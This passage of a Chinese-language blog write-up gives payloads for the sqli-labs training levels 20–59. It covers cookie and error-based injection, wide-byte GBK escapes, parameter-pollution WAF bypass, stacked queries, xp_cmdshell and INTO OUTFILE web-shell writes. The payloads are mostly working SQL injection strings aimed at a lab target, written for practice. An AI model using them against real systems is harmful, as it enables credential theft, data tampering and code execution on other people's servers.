<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">修改 cookie 为</span><br><span class="line">uname=admin1&#x27;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br><span class="line"></span><br><span class="line">GET /Less-20/ HTTP/1.1</span><br><span class="line">Host: be02b77a-c78d-42fd-94ef-a2d8bd63d8a8.node5.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://be02b77a-c78d-42fd-94ef-a2d8bd63d8a8.node5.buuoj.cn</span><br><span class="line">Cookie: uname=admin1&#x27;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://be02b77a-c78d-42fd-94ef-a2d8bd63d8a8.node5.buuoj.cn/Less-20/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>

<h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改 cookie 为</span><br><span class="line">uname=admin1&#x27;)and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br><span class="line">base64一下</span><br><span class="line">uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure>

<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改 cookie 为</span><br><span class="line">uname=admin1&quot;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</span><br><span class="line">base64一下</span><br><span class="line">uname=YWRtaW4xImFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure>

<h2 id="Advanced-injection"><a href="#Advanced-injection" class="headerlink" title="Advanced injection"></a>Advanced injection</h2><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤了#和--+</span><br><span class="line">?id=-1&#x27;union select 1,@@datadir,&#x27;3</span><br></pre></td></tr></table></figure>
<p>第一个’闭合-1, 第二个’闭合后面的。这样将查询内容显示在 username 处</p>
<p>还可以报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;or extractvalue(1,concat(0x7e,database())) or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>本关为二次注入的示例。二次注入也称为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此例子中我们的步骤是注册一个admin&#x27;#的账号，接下来登录该帐号后进行修改密码。此时修改的就是admin的密码。</span><br><span class="line">Sql 语句变为 UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#x27;admin&#x27;#&#x27; AND password=&#x27;</span><br><span class="line">也就是执行了 UPDATE users SET passwd=&quot;New_Pass&quot; WHERE username =&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>or和and被过滤</p>
<p>常用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)大小写变形 Or,OR,oR</span><br><span class="line">(2)编码: hex, urlencode</span><br><span class="line">(3)添加注释/*or*/</span><br><span class="line">(4)利用符号 and=&amp;&amp; or=||</span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;&amp;1=1--+</span><br><span class="line">?id=1&#x27;|| extractvalue(1,concat(0x7e,database()))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>or和and被过滤，报错注入不能用，可以联合注入和盲注</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,@@basedir,3#</span><br><span class="line">?id=20||1=1--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>过滤空格, or, and, &#x2F;*, #, –, &#x2F;等各种符号</p>
<p>对于注释和结尾字符的我们此处只能利用构造一个’来闭合后面的’<br>对于空格，有较多的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure>

<p>回到本题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),1))||&#x27;0   爆表</span><br><span class="line">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;aandnd(table_name=&#x27;users&#x27;)))),1))||&#x27;0     爆字段</span><br><span class="line">?id=1&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#x27;0   爆密码账户</span><br></pre></td></tr></table></figure>
<p>没用%0a这些是因为apache解析不了。只能使用()绕过。报错注入空格使用比较少所以我们可以使用报错注入</p>
<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>无法报错注入了，用联合注入，并且闭合方式换成了’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)union(select(1),(2),(select(database())));%00</span><br></pre></td></tr></table></figure>

<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>在Less-26基础上过滤了union和select,大小写绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;uNion(sElect(1),(2),(sElect(database())));%00</span><br></pre></td></tr></table></figure>

<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>换成了”闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;uNion(sElect(1),(2),(sElect(database())));%00</span><br><span class="line">?id=100&quot;%a0UnIon%a0SElecT%a01,user(),&quot;3</span><br></pre></td></tr></table></figure>

<h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>‘)型闭合，其余和Less-27一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27;)uNion(sElect(1),(2),(sElect(database())));%00</span><br></pre></td></tr></table></figure>

<h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>跟Less-28一样</p>
<h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>首先介绍一下 29,30,31 这三关的基本情况：<br><img src="/2025/04/03/sqli-labs/2.png" alt="alt text"><br>服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。<br>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重点：index.php?id=1&amp;id=2，你猜猜到底是显示 id=1 的数据还是显示 id=2 的？</span><br><span class="line">Explain：apache(php)解析最后一个参数，即显示 id=2 的内容。Tomcat(jsp)解析第一个参数，即显示 id=1 的内容。</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/03/sqli-labs/1.png" alt="参数解析方式"><br>此处我们想一个问题：index.jsp?id&#x3D;1&amp;id&#x3D;2 请求，针对本题服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php）服务器，apache 解析最后一个参数。那最终返回客户端的应该是哪个参数？<br>Answer：此处应该是 id&#x3D;2 的内容，应为时间上提供服务的是 apache（php）服务器，返回的数据也应该是 apache 处理的数据。而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。</p>
<p>回到本题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&#x27;union select 1,user(),3--+</span><br><span class="line">?id=1&amp;id=0&#x27;and extractvalue(1,concat(0x7e,(select database())))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>“型闭合，其余与Less-29一致</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;union select 1,user(),3--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><p>“)型闭合，其余与Less-29一致</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-2&quot;)union select 1,user(),3--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>Less-32,33,34,35,36,37 六关全部是针对’和\的过滤，所以我们放在一起来进行讨论。<br>在此先介绍一下宽字节注入的原理和基本用法。<br>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤’的时候，往往利用的思路是将’转换为\‘（转换的函数或者思路会在每一关遇到的时候介绍）。因此我们在此想办法将’前面添加的\除掉，一般有两种思路：<br>1、%df吃掉\具体的原因是 urlencode(‘\) &#x3D; %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2、将\‘中的\过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c会被前面的%5c给注释掉。这也是 bypass 的一种方法。</p>
<p>回到本题，输入?id&#x3D;1’发现’被转义，用宽字节注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>


<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>payload参考Less-32<br>本关使用了addslashes函数来防御sql注入，但是仍然可以使用宽字节注入绕过。<br>我们需要将mysql_query设置为binary的方式，才能防御此漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET</span><br><span class="line">character_set_connection=gbk,character_set_result=gbk,character_set_client=binary&quot;,$conn);</span><br></pre></td></tr></table></figure>

<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>在post型的注入当中，可将utf-8转换为utf-16或utf-32，例如将’转为utf-16为�’。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: �&#x27;or 1=1#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure>

<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,user(),3--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>Less-36和Less-37使用了mysql_real_escape_string()函数进行转义，但是因mysql并没有设置成gbk，所以 mysql_real_escape_string()依旧能够被突破。方法和上面是一样的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%EF%BF%BD%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
<p>这里是利用’的utf-16进行突破的，也可以利用%df。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure>
<p>在使用mysql_real_escape_string()时，为了能够安全的防护这种问题，将mysql设置为gbk即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_set_charset(&#x27;gbk&#x27;,&#x27;$conn&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>payload参考Less-34</p>
<h2 id="Stacked-injection"><a href="#Stacked-injection" class="headerlink" title="Stacked injection"></a>Stacked injection</h2><p>各种数据库基本语法介绍</p>
<p>Mysql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br><span class="line">select * from users where id=1;drop table test;</span><br><span class="line">select * from users where id=1;select 1,2,3;</span><br><span class="line">select * from users where id=1;select load_file(&#x27;c:/tmpupbbn.php&#x27;);</span><br><span class="line">select * from users where id=1;insert into users(id,username,password) values(&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br></pre></td></tr></table></figure>

<p>Mssql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from test;create table sc3(ss CHAR(8));</span><br><span class="line">select * from test;drop table sc3;</span><br><span class="line">select 1,2,3;select * from test;</span><br><span class="line">select * from test;update test set name=&#x27;test&#x27; where id=3;</span><br><span class="line">select * from test where id=1;exec master..xp_cmdshell &#x27;ipconfig&#x27;  #sqlserver中最为重要的存储过程的执行</span><br></pre></td></tr></table></figure>

<p>Oracle无法堆叠注入</p>
<p>Postgresql</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;create table user_data(id DATE);</span><br><span class="line">select * from user_test;delete from user_data;</span><br><span class="line">select * from user_test;select 1,2,3;</span><br><span class="line">select * from user_test;update user_test set name=&#x27;modify&#x27; where name=&#x27;张三&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>Less-38至Less-45是用来熟悉堆叠注入的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;insert into users(id,username,password) values(&#x27;38&#x27;,&#x27;less38&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(&#x27;39&#x27;,&#x27;less39&#x27;,&#x27;hello&#x27;)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);insert into users(id,username, password) values(&#x27;109&#x27;,&#x27;less40&#x27;,&#x27;hello&#x27;)%23</span><br></pre></td></tr></table></figure>

<h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(&#x27;110&#x27;,&#x27;less41&#x27;,&#x27;hello&#x27;)%23</span><br></pre></td></tr></table></figure>

<h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: c&#x27;;create table less42 like users#</span><br></pre></td></tr></table></figure>

<h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: c&#x27;);create table less43 like users#</span><br></pre></td></tr></table></figure>

<h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: a&#x27;;insert into users(id,username,password) values (&#x27;144&#x27;,&#x27;less44&#x27;,&#x27;hello&#x27;)#</span><br></pre></td></tr></table></figure>

<h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: c&#x27;);create table less45 like users#</span><br></pre></td></tr></table></figure>

<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>Less46-Less53是order by相关注入<br>本关的sql语句为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>
<p>尝试?sort&#x3D;1 desc 或者 asc，显示结果不同，则表明可以注入。（升序 or 降序排列）</p>
<p>(1)order by后的数字可以作为一个注入点。也就是构造order by后的一个语句，让该语句执行结果为一个数，我们尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=right(version(),1)</span><br></pre></td></tr></table></figure>
<p>没有报错，但是right换成left都一样，说明数字没有起作用。此时可以用报错注入和延时注入。<br>1.直接添加注入语句，?sort&#x3D;(select ******)<br>2.利用一些函数。例如 rand()函数等。?sort&#x3D;rand(sql语句)<br>3.利用 and，例如?sort&#x3D;1 and (加sql语句)。?sort&#x3D;rand(ture)和?sort&#x3D;rand(false)的结果是不一样的<br>同时，sql语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?sort=(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)) limit 0,1)  #报错注入</span><br><span class="line">?sort=rand(ascii(left(database(),1))=115)  #布尔盲注</span><br><span class="line">?sort=(select if(substring(current,1,1)=char(115),benchmark(50000000,md5(&#x27;1&#x27;)),null) from (select database() as current) as tb1)  #时间盲注</span><br><span class="line">?sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5))  #时间盲注</span><br></pre></td></tr></table></figure>

<p>(2)procedure analyse参数后注入<br>利用procedure analyse参数，我们可以执行报错注入。同时，在procedure analyse和order by之间可以存在limit参数，我们在实际应用中，往往也可能会存在limit后的注入，可以利用procedure analyse进行注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)</span><br></pre></td></tr></table></figure>

<p>(3)导入导出文件 into outfile</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;c:\\wamp\\www\\sqllib\\test1.txt&quot;  #将查询结果导入到文件当中</span><br></pre></td></tr></table></figure>
<p>那这个时候我们可以考虑上传木马，利用lines terminated by。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;c:\\wamp\\www\\sqllib\\test1.php&quot; lines terminated by 0x(木马经过16进制转换)</span><br></pre></td></tr></table></figure>

<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;and rand(ascii(left(database(),1))=115)--+  #有点问题，对错结果都一样</span><br><span class="line">?sort=1&#x27;and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+</span><br><span class="line">?sort=1&#x27;and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</span><br><span class="line">?sort=1&#x27;and if(ascii(substr(database(),1,1))=115,0,sleep(5))--+</span><br><span class="line">?sort=1&#x27;procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+</span><br><span class="line">?sort=1&#x27;into outfile &quot;c:\\wamp\\www\\sqllib\\test.txt%&quot;--+</span><br><span class="line">?sort=1&#x27;into outfile &quot;c:\\wamp\\www\\sqllib\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+  #此处的16进制文件为&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))=178)</span><br><span class="line">?sort=1 and (if(ascii(substr(database(),1,1))=115,0,sleep(5)))</span><br></pre></td></tr></table></figure>

<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;and (if(ascii(substr((select username from users where id=1),1,1))=69,0,sleep(5)))--+</span><br><span class="line">?sort=1&#x27;into outfile &quot;c:\\wamp\\www\\sqllib\\test.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>Less-50至Less-53是order by stacked injection<br>这几关使用的是mysqli_multi_query()函数，而之前使用的是mysqli _query()，区别在于mysqli_multi_query()可以执行多个sql语句，而mysqli_query()只能执行一个sql语句，那么此处就可以执行多个sql语句进行注入，也就是堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table less50 like users</span><br></pre></td></tr></table></figure>

<h3 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table less51 like users--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table less52 like users</span><br></pre></td></tr></table></figure>

<h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&#x27;;create table less53 like users--+</span><br></pre></td></tr></table></figure>

<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;J035VPGANL&#x27;--+</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(secret_O8GE) from challenges.J035VPGANL--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1)union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;%23</span><br></pre></td></tr></table></figure>

<h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure>

